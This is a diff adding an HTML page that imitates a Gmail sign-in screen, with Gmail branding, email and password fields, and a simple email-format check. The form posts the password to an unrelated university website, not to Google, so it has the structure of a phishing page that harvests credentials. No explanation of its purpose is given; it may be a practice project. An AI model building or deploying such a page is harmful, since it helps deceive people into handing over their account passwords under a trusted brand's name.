@@ -1,0 +1,106 @@
+<html>
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<title>Gmail</title>
+<style>
+body
+{
+background:powderblue;;
+margin-top:120px;
+}
+input[type=text], select {
+  width: 30%;
+  padding: 15px 2px;
+  margin: 8px 10px;
+  display: inline-block;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
+input[type=password], select {
+  width: 30%;
+  padding: 15px 2px;
+  margin: 8px 10px;
+  display: inline-block;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
+button {
+  margin-left: 00px;
+  background-color:red;
+  color: white;
+  padding: 15px 25px;
+  text-align: center;
+  font-size: 16px;
+  cursor: pointer;
+}
+.bg-text {
+ 
+  color: white;
+     margin: auto;
+  font-weight: bold;
+
+  position: absolute;
+  top: 60%;
+   
+height: 70%;
+  left: 50%;
+  transform: translate(-60%, -60%);
+  width: 70%;
+  padding: 20px;
+ text-align: center;
+}
+body {
+  background-image: url('https://i.vimeocdn.com/video/590328518_640x360.jpg');
+  background-position: center center;
+        
+  
+  /* Background image doesn't tile */
+  background-repeat: no-repeat;
+  
+  /* Background image is fixed in the viewport so that it doesn't move when 
+     the content's height is greater than the image's height */
+  background-attachment: fixed;
+  
+  /* This is what makes the background image rescale based
+     on the container's size */
+  background-size: cover;
+  
+  /* Set a background color that will be displayed
+     while the background image is loading */
+  background-color: #464646;
+  
+}
+</style>
+
+
+<script language="javascript">
+function checkEmail() {
+
+    var email = document.getElementById('txtEmail');
+     var password1 = document.getElementById('pass');
+    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+    if (!filter.test(email.value)) 
+    {
+    alert('Please provide a valid email address');
+    email.focus;
+    return false;
+    }
+   
+    
+}
+</script>
+</head>
+<body><div class="bg-image"></div>
+<div class="bg-text"><center>
+<p><i class="fa fa-google" style="font-size:48px;color:red"></i><font size="10" color="red">mail </p>
+ <form action="https://www.chitkarauniversity.edu.in/" method="post" name="form">
+<input type='text' placeholder="Enter your Email Id" id='txtEmail' required>
+<br><input type="Password" placeholder="Password" name="password" id="pass" required>
+       <br>
+       <button  onclick='Javascript:checkEmail();'/>Sign In</button><br></font>
+    </center></div>
+</body>
+</html>
